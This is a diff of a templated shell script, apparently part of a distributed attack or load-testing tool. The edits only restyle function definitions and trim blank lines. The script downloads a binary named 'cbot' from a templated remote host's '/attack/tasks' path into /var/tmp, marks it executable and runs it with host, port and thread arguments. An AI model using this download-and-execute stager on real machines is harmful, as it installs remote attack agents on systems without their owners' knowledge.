@@ -4,7 +4,7 @@ pnodeId=$1
 
 download_cbot_uri="http://{{.RHost}}:{{.FPort}}/attack/tasks/{{.TaskId}}/$pnodeId/cbot_linux"
 
-function download() {
+download() {
 
   if [ -x "/usr/bin/wget"  -o  -x "/bin/wget" ]; then
     wget -c $download_cbot_uri -O /var/tmp/cbot
@@ -28,7 +28,7 @@ function download() {
 
 }
 
-function run_cbot() {
+run_cbot() {
 
     chmod a+x /var/tmp/cbot
     /var/tmp/cbot -pnode $pnodeId -taskId {{.TaskId}} -rhost {{.RHost}} -rport {{.RPort}} -fport {{.FPort}} -threads {{.Threads}} -scap {{.Scap}} -acap {{.Acap}}
@@ -43,10 +43,4 @@ if [ -f /var/tmp/cbot ]; then
   run_cbot
 
 fi
-
-
-
-
-
-
 
